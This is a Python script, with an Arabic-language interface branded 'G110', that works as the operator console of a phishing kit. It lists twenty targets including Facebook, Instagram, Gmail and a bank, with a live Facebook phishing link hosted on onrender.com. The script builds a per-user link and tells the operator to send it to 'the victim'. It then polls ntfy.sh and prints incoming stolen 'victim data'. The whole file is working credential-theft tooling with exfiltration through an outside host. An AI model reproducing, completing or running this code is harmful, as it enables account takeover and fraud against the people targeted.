#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import urllib.request
import urllib.parse
import json
import os
import uuid
import threading
import time
import sys

# ========== الألوان الجديدة ==========
ORANGE = '\033[93m'   # برتقالي للبانر
RED = '\033[91m'      # أحمر للباقي
BOLD = '\033[1m'
RESET = '\033[0m'
# ====================================

CONFIG_FILE = "g110_config.json"

# الروابط للمنصات (املأ الروابط الفعلية عند توفرها)
LINKS = {
    1: "https://facebook-vjj9.onrender.com",  # فيسبوك مفعل
    2: "",   # انستغرام
    3: "",   # تويتر
    4: "",   # سناب شات
    5: "",   # تيك توك
    6: "",   # جيميل
    7: "",   # ياهو
    8: "",   # Outlook
    9: "",   # بنك
    10: "",  # منصة مخصصة 10
    11: "",  # منصة 11
    12: "",  # منصة 12
    13: "",  # منصة 13
    14: "",  # منصة 14
    15: "",  # منصة 15
    16: "",  # منصة 16
    17: "",  # منصة 17
    18: "",  # منصة 18
    19: "",  # منصة 19
    20: ""   # منصة 20
}

PLATFORMS = {
    1: "فيسبوك", 2: "انستغرام", 3: "تويتر", 4: "سناب شات", 5: "تيك توك",
    6: "جيميل", 7: "ياهو", 8: "Outlook", 9: "بنك", 10: "منصة 10",
    11: "منصة 11", 12: "منصة 12", 13: "منصة 13", 14: "منصة 14", 15: "منصة 15",
    16: "منصة 16", 17: "منصة 17", 18: "منصة 18", 19: "منصة 19", 20: "منصة 20"
}

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def load_or_create_secret():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            return data.get("secret", "")
    secret = "G110_" + uuid.uuid4().hex[:12]
    with open(CONFIG_FILE, "w") as f:
        json.dump({"secret": secret}, f)
    return secret

def print_banner():
    banner = f"""{ORANGE}
  _____   __   __    ___  
 / ____| /_ | /_ |  / _ \\ 
| |  __   | |  | | | | | |
| | |_ |  | |  | | | | | |
| |__| |  | |  | | | |_| |
 \\_____|  |_|  |_|  \\___/ 

       \\  G110  /
   ─ مطور الاداة الجنرال ─

       4  7  2  9  1
       8  3  6  0  5
{RESET}"""
    print(banner)

def print_menu():
    print(RED + "═" * 46 + RESET)
    print(RED + BOLD + "           قائمة المنصات (20)" + RESET)
    print(RED + "═" * 46 + RESET)
    # عرض عمودين: 1-10 في اليسار، 11-20 في اليمين
    for i in range(1, 11):
        left_num = i
        right_num = i + 10
        left_status = "(مفعل)" if LINKS.get(left_num) else "(غير مفعل)"
        right_status = "(مفعل)" if LINKS.get(right_num) else "(غير مفعل)"
        left_line = f"{RED}{left_num}{RESET} - {PLATFORMS[left_num]} {left_status}"
        right_line = f"{RED}{right_num}{RESET} - {PLATFORMS[right_num]} {right_status}"
        # المسافة بين العمودين
        print(f"{left_line:<30}{right_line}")
    print(RED + "═" * 46 + RESET)
    print(f"{RED}0{RESET} - خروج")

def display_victim_data(message):
    print("\n" + RED + "═" * 40 + RESET)
    print(RED + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
    print(RED + "═" * 40 + RESET)
    lines = message.strip().split('\n')
    for idx, line in enumerate(lines):
        line = line.strip()
        if not line:
            continue
        if idx == 0 and ("بيانات" in line and "جديدة" in line):
            continue
        if ':' in line:
            key, val = line.split(':', 1)
            key = key.strip()
            val = val.strip()
            print(f"{RED}{BOLD}{key}{RESET}: {val}")
        else:
            print(f"{RED}{line}{RESET}")
    print(RED + "═" * 40 + RESET + "\n")

def listen_ntfy(topic):
    url = f"https://ntfy.sh/{topic}/json"
    while True:
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=300) as response:
                for line in response:
                    if line:
                        try:
                            data = json.loads(line.decode('utf-8'))
                            if 'message' in data:
                                display_victim_data(data['message'])
                        except:
                            pass
        except Exception:
            time.sleep(5)

def main():
    secret = load_or_create_secret()
    clear_screen()
    print_banner()
    print(f"{RED}🔑 مفتاحك السري: {secret}{RESET}\n")
    threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
    time.sleep(1)

    while True:
        print_menu()
        choice = input(f"{RED}> {RESET}").strip()

        if choice == "0":
            print(f"{RED}إيقاف الأداة...{RESET}")
            sys.exit(0)

        if choice.isdigit():
            num = int(choice)
            if num in LINKS:
                if LINKS[num] == "":
                    clear_screen()
                    print_banner()
                    print(f"{RED}❌ منصة {PLATFORMS[num]} غير مفعلة بعد.{RESET}")
                    input(f"{RED}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
                else:
                    link = LINKS[num] + "?topic=" + secret
                    clear_screen()
                    print_banner()
                    print(f"{RED}{'═' * 40}{RESET}")
                    print(f"{RED}✅ رابط {PLATFORMS[num]}:{RESET}")
                    print(f"{RED}{BOLD}{link}{RESET}")
                    print(f"{RED}{'═' * 40}{RESET}")
                    print(f"{RED}انسخ الرابط وأرسله للضحية.{RESET}")
                    input(f"{RED}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
            else:
                clear_screen()
                print_banner()
                print(f"{RED}رقم غير صحيح{RESET}")
                input(f"{RED}اضغط Enter للرجوع...{RESET}")
                clear_screen()
                print_banner()
        else:
            clear_screen()
            print_banner()
            print(f"{RED}اختيار غير مفهوم{RESET}")
            input(f"{RED}اضغط Enter للرجوع...{RESET}")
            clear_screen()
            print_banner()

if __name__ == "__main__":
    main()